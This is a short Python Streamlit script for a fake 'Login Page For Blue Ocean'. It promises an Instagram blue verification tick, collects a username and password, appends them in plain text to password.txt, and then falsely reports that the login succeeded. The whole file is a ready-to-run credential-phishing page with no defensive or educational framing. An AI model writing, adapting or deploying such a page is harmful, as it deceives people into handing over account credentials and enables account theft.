import streamlit as st

# Function to save username and password to a file
def save_credentials(username, password):
    with open('password.txt', 'a') as file:
        file.write(f"{username}:{password}\n")

# Streamlit app
st.set_page_config(page_title="Login Page For Blue Ocean", page_icon="🔒")

st.title("Login Page For Blue Ocean")

username = st.text_input("Username")
password = st.text_input("Password", type="password")

if st.button("Login"):
    save_credentials(username, password)
    st.success("Login successful! You have received a blue tick on Instagram.")
    st.success("You will get the blue tick within 24 hours.")

# Message prompting for username and password
else:
    st.info("Please enter your username and password to login.")
